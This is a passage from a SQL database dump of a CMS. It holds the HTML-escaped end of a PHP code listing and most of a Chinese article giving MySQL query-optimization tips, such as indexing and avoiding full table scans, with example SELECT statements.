style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;false;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;true;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;elseif&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;true;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;else&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;false;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;} &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1302427061, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(41, 1, '提高MYSQL百万条数据的查询速度-mysql优化', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family:arial, sans-serif, helvetica, tahoma;&quot;&gt;&lt;div class=&quot;blog_content&quot;&gt;&lt;table id=&quot;blogContentTable&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tbody style=&quot;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;&lt;tr style=&quot;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;&lt;td valign=&quot;top&quot; style=&quot;font-size:1em;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;&lt;div id=&quot;blogContainer&quot; style=&quot;height:2538px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;&lt;div id=&quot;blogDetailDiv&quot; style=&quot;font-size:14px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;&lt;table border=&quot;0&quot;&gt;&lt;tbody style=&quot;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;&lt;tr style=&quot;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;&lt;td style=&quot;font-size:1em;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;&lt;div class=&quot;cnt&quot; style=&quot;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;1.对查询进行优化，应尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;2.应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，如：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where num is null&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;可以在num上设置默认值0，确保表中num列没有null值，然后这样查询：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where num=0&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;3.应尽量避免在 where 子句中使用!=或&amp;lt;&amp;gt;操作符，否则将引擎放弃使用索引而进行全表扫描。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;4.应尽量避免在 where 子句中使用 or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，如：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where num=10 or num=20&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;可以这样查询：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where num=10&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;union all&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where num=20&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;5.in 和 not in 也要慎用，否则会导致全表扫描，如：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where num in(1,2,3)&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;对于连续的数值，能用 between 就不要用 in 了：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where num between 1 and 3&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;6.下面的查询也将导致全表扫描：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where name like ''%abc%''&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;若要提高效率，可以考虑全文检索。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;7.如果在 where 子句中使用参数，也会导致全表扫描。因为SQL只有在运行时才会解析局部变量，但优化程序不能将访问计划的选择推迟到运行时；它必须在编译时进行选择。然而，如果在编译时建立访问计划，变量的值还是未知的，因而无法作为索引选择的输入项。如下面语句将进行全表扫描：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where&lt;/span&gt;&lt;a href=&quot;mailto:num=@num&quot; target=&quot;_blank&quot; style=&quot;color:#717171;text-decoration:underline;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;num=@num&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;可以改为强制查询使用索引：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t with(index(索引名)) where&lt;/span&gt;&lt;a href=&quot;mailto:num=@num&quot; target=&quot;_blank&quot; style=&quot;color:#717171;text-decoration:underline;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;num=@num&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;8.应尽量避免在 where 子句中对字段进行表达式操作，这将导致引擎放弃使用索引而进行全表扫描。如：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where num/2=100&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;应改为:&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where num=100*2&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;9.应尽量避免在where子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where substring(name,1,3)=''abc''--name以abc开头的id&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where datediff(day,createdate,''2005-11-30'')=0--‘2005-11-30’生成的id&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;应改为:&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where name like ''abc%''&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select id from t where createdate&amp;gt;=''2005-11-30'' and createdate&amp;lt;''2005-12-1''&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;10.不要在 where 子句中的“=”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;11.在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;该索引将不会被使用，并且应尽可能的让字段顺序与索引顺序相一致。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;12.不要写一些没有意义的查询，如需要生成一个空表结构：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select col1,col2 into #t from t where 1=0&lt;/span&gt;&lt;/p&gt;\r\n&lt;p 